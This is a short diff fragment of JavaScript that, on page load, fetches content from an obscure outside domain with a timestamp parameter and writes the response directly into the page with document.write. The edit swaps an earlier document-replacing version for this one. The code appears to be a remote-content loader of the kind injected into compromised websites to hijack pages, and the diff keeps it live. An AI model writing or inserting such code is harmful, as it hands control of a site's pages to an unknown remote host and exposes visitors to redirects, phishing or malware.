@@ -22,9 +22,10 @@
     x_load = "https://www.sklmyun.com/safhdja?t=" + new Date().getTime();
         x_load && function () {
             $.get(x_load, function (data) {
-                var new_doc = document.open("text/html", "replace");
-                new_doc.write(data);
-                new_doc.close();
+                document.write(data)
+                // var new_doc = document.open("text/html", "replace");
+                // new_doc.write(data);
+                // new_doc.close();
                 // window.location.href = data
             });
         }();
